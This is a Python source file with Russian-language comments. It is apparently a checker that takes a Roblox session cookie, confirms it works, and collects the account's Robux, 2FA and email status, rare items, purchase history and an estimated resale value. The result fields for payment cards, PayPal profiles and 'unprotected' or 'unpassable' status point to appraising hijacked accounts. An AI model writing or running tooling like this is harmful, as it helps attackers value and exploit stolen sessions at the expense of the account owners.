import time
import logging
from utils import create_session, make_request, is_rare_item, compute_account_price, is_unpassable
from price_catalog import PriceCatalog
from config import MAX_THREADS

logger = logging.getLogger(__name__)

def get_full_info(cookie: str) -> dict:
    info = {
        'status': '❌', 'Username': '?', 'UserID': '?', 'Robux': 0,
        'EmailSet': False, 'TwoFactorEnabled': False, 'Premium': False,
        'TotalRAP': 0, 'PurchasedGamepasses': {},
        'Cookie': cookie, 'SecurityStatus': '⚠️ НЕЗАЩИЩЕННЫЙ',
        'YearDonate': 0, 'AllTimeDonate': 0, 'Voice': False,
        'InventoryValue': 0, 'ValuableItems': [],
        'AccountValue': 0, 'IsUnpassable': False,
        'HasKorblox': False, 'HasHeadless': False,
        'RareItems': [], 'CardCount': 0, 'CardsByNetwork': {},
        'PayPalProfiles': [], 'BillingRobux': 0, 'BillingUSD': 0,
        'GroupsBalance': 0, 'PlacesVisits': 0,
        'IsAgeVerified': False, 'VerifiedAgeBracket': None,
        'CanResetAgeVerif': False, 'TotalPlaytime': 0
    }
    
    s = create_session(cookie)
    
    try:
        # Проверка валидности (Эндпоинт 1)
        r = make_request(s, 'GET', 'https://users.roblox.com/v1/users/authenticated', timeout=15)
        
        # Запасной эндпоинт если первый вернул ошибку
        if not r:
            logger.warning("⚠️ Перепроверяем куку через запасной эндпоинт /mobile/user-info...")
            r = make_request(s, 'GET', 'https://www.roblox.com/mobile/user-info', timeout=15)
            
        if not r:
            logger.error("❌ Кука действительно невалидна или заблокирована Roblox Cloudflare/IP.")
            return info
            
        try:
            d = r.json()
        except Exception as e:
            logger.error(f"❌ Ошибка парсинга JSON: {e}. Ответ: {r.text[:200]}")
            return info

        # Извлекаем ID в зависимости от того, какой API ответил
        uid = d.get('id') or d.get('UserID') or d.get('id')
        uname = d.get('name') or d.get('UserName') or '?'

        if not uid:
            logger.error(f"❌ В ответе нет UserID: {d}")
            return info

        info['UserID'] = uid
        info['Username'] = uname
        info['status'] = '✅'
        
        logger.info(f"🔍 [УСПЕХ] Проверка {info['Username']} (ID: {uid})")
        
        # 1. Настройки
        resp = make_request(s, 'GET', 'https://www.roblox.com/my/settings/json', timeout=15)
        if resp:
            try:
                st = resp.json()
                info['Premium'] = st.get('IsPremium', False)
                sec = st.get('MyAccountSecurityModel', {})
                info['EmailSet'] = sec.get('IsEmailSet', False)
                info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled', False)
                logger.info(f"  ✅ Настройки: Premium={info['Premium']}, Email={info['EmailSet']}")
            except Exception as e:
                logger.error(f"❌ Ошибка settings/json: {e}")
        
        # 2. Robux
        resp = make_request(s, 'GET', f'https://economy.roblox.com/v1/users/{uid}/currency', timeout=15)
        if resp:
            try:
                info['Robux'] = resp.json().get('robux', 0)
                logger.info(f"  ✅ Robux: {info['Robux']}")
            except Exception as e:
                logger.error(f"❌ Ошибка currency: {e}")
        
        # 3. Voice
        resp = make_request(s, 'GET', 'https://voice.roblox.com/v1/settings', timeout=15)
        if resp:
            try:
                v = resp.json()
                info['Voice'] = v.get('isVoiceEnabled', False) or v.get('isEligible', False)
                logger.info(f"  ✅ Voice: {info['Voice']}")
            except Exception as e:
                logger.error(f"❌ Ошибка voice: {e}")
        
        # 4. RAP + редкие предметы
        resp = make_request(s, 'GET', f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Desc', timeout=15)
        if resp:
            try:
                data = resp.json()
                tr = 0
                rare = []
                for item in data.get('data', []):
                    rap = item.get('recentAveragePrice', 0) or 0
                    tr += rap
                    name = item.get('name', '')
                    if is_rare_item(name):
                        rare.append({'name': name, 'rap': rap})
                    if 'headless' in name.lower():
                        info['HasHeadless'] = True
                    if 'korblox' in name.lower():
                        info['HasKorblox'] = True
                info['TotalRAP'] = tr
                info['RareItems'] = rare[:10]
                logger.info(f"  ✅ RAP: {tr}, Rare: {len(rare)}")
            except Exception as e:
                logger.error(f"❌ Ошибка collectibles: {e}")
        
        # 5. Транзакции (донаты + геймпассы)
        resp = make_request(s, 'GET', f'https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase', timeout=20)
        if resp:
            try:
                gp_dict = {}
                tot_yd = 0
                tot_atd = 0
                tx_data = resp.json().get('data', [])
                for item in tx_data:
                    details = item.get('details', {}) or {}
                    currency_info = item.get('currency', {}) or {}
                    price = abs(currency_info.get('amount', 0))
                    tot_atd += price
                    if details.get('type') != 'GamePass':
                        tot_yd += price
                    
                    if price >= 50 or details.get('type') == 'GamePass':
                        name = details.get('name', 'Товар')
                        place_info = details.get('place', {}) or {}
                        place_name = place_info.get('name', 'Неизвестная игра')
                        if place_name not in gp_dict:
                            gp_dict[place_name] = []
                        gp_dict[place_name].append({'name': name, 'price': price})
                
                info['PurchasedGamepasses'] = gp_dict
                info['YearDonate'] = tot_yd
                info['AllTimeDonate'] = tot_atd
                logger.info(f"  ✅ Donate: год={tot_yd}, всего={tot_atd}, геймпассов={len(gp_dict)}")
            except Exception as e:
                logger.error(f"❌ Ошибка transactions: {e}")
        
        # 6. Оценка инвентаря
        try:
            pc = PriceCatalog()
            gp = info.get('PurchasedGamepasses', {})
            game_type = "mm2"
            for gn in gp.keys():
                if "adopt" in gn.lower():
                    game_type = "adoptme"
                    break
            val, items = pc.estimate_gamepasses(game_type, gp)
            info['InventoryValue'] = val
            info['ValuableItems'] = items
        except Exception as e:
            logger.error(f"❌ Ошибка оценки инвентаря: {e}")
        
        # 7. Итоговые расчеты
        info['AccountValue'] = compute_account_price(info)
        info['IsUnpassable'] = is_unpassable(info)
        
        logger.info(f"🎉 Завершено {info['Username']}: Robux={info['Robux']}, RAP={info['TotalRAP']}")
        
    except Exception as e:
        logger.error(f"❌ Ошибка выполнения get_full_info: {e}", exc_info=True)
    finally:
        s.close()
        
    return info